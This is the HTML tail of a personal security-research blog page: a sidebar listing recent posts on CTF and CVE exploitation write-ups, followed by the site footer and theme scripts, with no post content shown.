fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"/></a><div class="content"><a class="title" href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</a><time datetime="2023-10-23T08:55:58.000Z" title="Created 2023-10-23 01:55:58">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/08/SDCTF-2023-Writeup/" title="SDCTF 2023 Writeup"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SDCTF 2023 Writeup"/></a><div class="content"><a class="title" href="/2023/05/08/SDCTF-2023-Writeup/" title="SDCTF 2023 Writeup">SDCTF 2023 Writeup</a><time datetime="2023-05-08T19:41:03.000Z" title="Created 2023-05-08 12:41:03">2023-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2020-11102: Escape from the Earth"/></a><div class="content"><a class="title" href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth">CVE-2020-11102: Escape from the Earth</a><time datetime="2023-04-25T07:50:54.000Z" title="Created 2023-04-25 00:50:54">2023-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2022-46702: Remember to Clean Up the Memory"/></a><div class="content"><a class="title" href="/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/" title="CVE-2022-46702: Remember to Clean Up the Memory">CVE-2022-46702: Remember to Clean Up the Memory</a><time datetime="2022-12-23T06:28:55.000Z" title="Created 2022-12-22 22:28:55">2022-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225"><img src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="evilCallback: CVE-2021-21225"/></a><div class="content"><a class="title" href="/2022/10/29/evilCallback-CVE-2021-21225/" title="evilCallback: CVE-2021-21225">evilCallback: CVE-2021-21225</a><time datetime="2022-10-29T19:27:58.000Z" title="Created 2022-10-29 12:27:58">2022-10-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By KpwnZ</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>